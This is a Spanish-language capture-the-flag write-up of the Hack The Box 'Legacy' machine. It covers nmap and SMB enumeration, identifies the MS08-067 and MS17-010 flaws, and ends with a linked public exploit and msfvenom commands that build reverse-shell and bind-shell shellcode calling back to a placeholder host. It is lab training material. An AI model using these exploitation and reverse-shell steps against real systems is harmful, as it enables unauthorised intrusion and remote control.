---
title: Hack The Box - Legacy
date: 2020-07-28 08:08:00 Z
---

![Legacy.jpg]({{site.baseurl}}/images/Legacy/Legacy.jpg)


Primer paso, será trazar una ruta hacía la máquina Legacy con el comando **ping**.

![ping.jpg]({{site.baseurl}}/images/Legacy/ping.jpg)

Una vez comprobado, que la información llegue correctamente a la máquina de destino. Empezaremos con recolectar información sobre Legacy.

# Recolección de Información

Con la herramienta **NMAP** recolectaremos información sobre los puertos abiertos.

```
sudo nmap -sC -sV 10.10.10.4 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 04:13 EDT
Nmap scan report for Legacy (10.10.10.4)
Host is up (0.097s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP;

Host script results:
|_clock-skew: mean: -4h23m11s, deviation: 2h07m16s, median: -5h53m11s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-28T08:23:06+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. 
Nmap done: 1 IP address (1 host up) scanned in 217.12 seconds
```
Observamos que están corriendo los puertos del Servicio **SAMBA**

Cito a nuestra amiga Wikipedia:
*
Samba es una implementación del protocolo de **archivos compartidos de Microsoft Windows** (antiguamente llamado SMB, renombrado recientemente a CIFS) para sistemas de tipo UNIX. 

Samba también permite validar usuarios haciendo de Controlador Principal de Dominio (PDC), como miembro de dominio e incluso como un dominio Active Directory para redes basadas en Windows; aparte de ser capaz de servir colas de impresión, directorios compartidos y autentificar con su propio archivo de usuarios.*

## SAMBA

Para recolectar samba, contamos con diferentes herramientas.

### NMAP

Nmap cuenta con scripts para obtener información sobre el servicio SAMBA. Tenemos script para enumerar información, y también para ver si es **vulnerable** a las vulnerabilidades más conocidas.

Podemos listas todos los scripts de está manera:

```ls -lh /usr/share/nmap/scripts/ | grep smb- ```

Primer paso, será enumerar el servicio, contamos con:

![nmap-samba-scripts.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-scripts.jpg)

Podemos hacer de todos ellos:

```nmap --script=smb-enum* -p 445 MACHINE_IP```

![nmap-samba-enum.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-enum.jpg)

El siguiente paso, será hacer uso de los scripts de vulnerabilidades

![nmap-samba-vuln.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-vuln.jpg) 




# Enumeración

Trás realizar el análisis, será ver y estructurar que información nos va a ser útil para realizar una correcta explotación.

Hemos observado diferentes **directorios** a través de **samba**, como son **$ADMIN**, **$C** , **$IPC**.
Podríamos intentar acceder a ellos para leer algún fichero, obtener más información, en definitiva, una investigación.
Si nos fijamos bien recibimos el error **NT_STATUS_INVALID_PARAMETER**

![errorNT_Status1.jpg]({{site.baseurl}}/images/Legacy/errorNT_Status1.jpg) 

Por lo cuál no perdamos el tiempo en intentar arreglarlo, como me paso a mí.

La siguiente información valiosas, son las **vulnerabilidades** obtenidas:

* **MS08-067**
* **MS17-010**

Debemos validar esta información, ya que puede estar parcheada.

# Explotación

Nos fijamos como objetivo atacar a la **vuln MS08-067**
Googleamos en busca de un exploit, encontramos este [https://github.com/andyacer/ms08_067](https://github.com/andyacer/ms08_067)

Antes de hacer uso del script, necesitamos tener instalado impacket.
```
git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
```
El siguiente paso será generar una **shellcode**, con el objetivo de obtener una conexión reversa hacía nuestro equipo.

Se nos recomienta estas, deberemos moficarlas para adaptarlas a nuestro entorno de red.

```
msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

